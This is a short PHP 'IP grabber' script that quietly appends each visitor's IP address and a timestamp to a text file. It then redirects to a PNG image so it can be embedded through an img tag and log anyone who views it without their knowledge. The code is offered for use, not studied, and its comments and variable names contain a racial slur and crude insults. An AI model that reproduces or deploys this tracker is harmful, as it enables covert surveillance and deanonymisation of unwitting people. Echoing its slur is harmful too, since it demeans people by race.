<?php
// set ur shit urself i wont teach u ez things
$eblan = 'logss.txt'; // will create a txt file with that name
$passwords_nad_niggers = $_SERVER['REMOTE_ADDR']; // gets ip
$content = "$passwords_nad_niggers | " . date('Y-m-d H:i:s') . PHP_EOL; // content that will be in the txt
file_put_contents($eblan, $content, FILE_APPEND);
header('Location: gnegrila.png'); // after grabbing ips will redirect u to the png so the "img src=" will work
?>
